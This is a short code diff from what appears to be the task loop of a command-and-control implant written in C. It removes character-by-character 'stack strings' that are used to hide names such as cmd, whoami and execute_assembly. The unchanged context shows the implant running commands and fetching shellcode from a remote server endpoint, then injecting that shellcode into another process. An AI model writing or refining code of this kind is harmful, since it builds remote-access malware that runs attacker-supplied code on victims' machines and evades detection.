@@ -291,11 +291,6 @@ void myMain()
             continue;
         }
 
-        CHAR cmd[] = { 'c', 'm', 'd', 0 };
-        CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
-        CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
-        CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
-
         if (my_strcmp(task.taskType, TASK_CMD) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task.taskParams, &sizeOfOutput);
@@ -330,7 +325,7 @@ void myMain()
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            taskOutput = executeAssembly;
+            taskOutput = TASK_EXECUTE_ASSEMBLY;
         }
         else
         {
